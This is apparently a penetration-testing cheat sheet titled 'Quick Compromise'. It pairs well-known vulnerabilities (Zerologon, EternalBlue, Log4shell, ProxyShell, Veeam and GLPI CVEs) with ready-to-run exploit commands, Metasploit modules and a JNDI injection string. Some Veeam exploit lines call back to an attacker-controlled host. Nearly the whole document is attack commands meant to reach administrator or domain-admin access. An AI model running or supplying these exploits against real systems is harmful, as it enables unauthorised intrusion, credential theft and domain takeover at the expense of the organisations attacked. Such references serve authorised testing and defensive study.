# Quick Compromise

## ⚠️ Zerologon (unsafe) CVE-2020-1472 @CVE@ >>> Domain admin
- `zerologon-scan '<dc_netbios_name>' '<ip>'`
- `cve-2020-1472-exploit.py <MACHINE_BIOS_NAME> <ip>`

## Eternal Blue MS17-010 @CVE@ >>> Admin || Low access
- `msf> exploit/windows/smb/ms17_010_eternalblue # SMBv1 only`

## Tomcat/Jboss Manager >>> Admin || Low access
- `msf> auxiliary/scanner/http/tomcat_enum`
- `msf> exploit/multi/http/tomcat_mgr_deploy`

## Java RMI >>> Admin || Low access
- `msf> use exploit/multi/misc/java_rmi_server`

## Java Serialiszed port >>> Admin || Low access
- `ysoserial.jar <gadget> '<cmd>' |nc <ip> <port>`

## Log4shell >>> Admin || Low access
- ${jndi:ldap://<ip>:<port>/o=reference}

## Database >>> Admin || Low access
- `msf> use auxiliary/admin/mssql/mssql_enum_sql_logins`

## Exchange >>> Admin
- Proxyshell @CVE@
  - `proxyshell_rce.py -u https://<exchange> -e administrator@<domain>`

## Veeam >>> User Account || Low access || Admin
- CVE-2023-27532 (creds - Veeam backup) @CVE@
  - `VeeamHax.exe --target <veeam_server>`
  - `CVE-2023-27532 net.tcp:/<target>:<port>/`
- CVE-2024-29849 (auth bypass - Veeam Backup Enterprise Manager) @CVE@
  - `CVE-2024-29849.py --target https://<veeam_ip>:<veeam_port>/ --callback-server <attacker_ip>:<port>`
- CVE-2024-29855 (auth bypass - Veeam Recovery Orchestrator) @CVE@
  - `CVE-2024-29855.py  --start_time <start_time_epoch> --end_time <end_time_epoch> --username <user>@<domain> --target https://<veeam_ip>:<veeam_port>/`
- CVE-2024-40711 (unserialize - Veeam backup) @CVE@
  - `CVE-2024-40711.exe -f binaryformatter -g Veeam -c http://<attacker_ip>:8000/trigger --targetveeam <veeam_ip>`

## GLPI >>> Admin || Low access
- CVE-2022-35914 @CVE@
  - /vendor/htmlawed/htmlawed/htmLawedTest.php
- CVE_2023_41320 @CVE@
  - `cve_2023_41320.py -u <user> -p <password> -t <ip>`

## Weak websites / services
- nuclei
  - `nuclei -target <ip_range>`
- nessus